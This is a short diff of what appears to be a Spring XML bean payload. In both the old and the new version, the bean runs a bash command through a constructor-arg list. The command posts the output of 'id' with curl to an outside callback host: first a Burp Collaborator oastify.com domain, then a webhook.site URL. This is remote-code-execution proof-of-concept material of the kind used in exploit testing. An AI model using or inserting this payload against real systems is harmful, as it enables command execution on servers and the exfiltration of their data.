@@ -7,7 +7,7 @@
             <list>
                 <value>bash</value>
                 <value>-c</value>
-                <value>curl http://0yzoojpgomgycqbpaj1j6ymzoquiid62.oastify.com/ -X POST -d "`id`"</value>
+                <value>curl https://webhook.site/eced5421-2f5f-4bf1-a914-3752b064aeda -X POST -d "`id`"</value>
             </list>
         </constructor-arg>
     </bean>
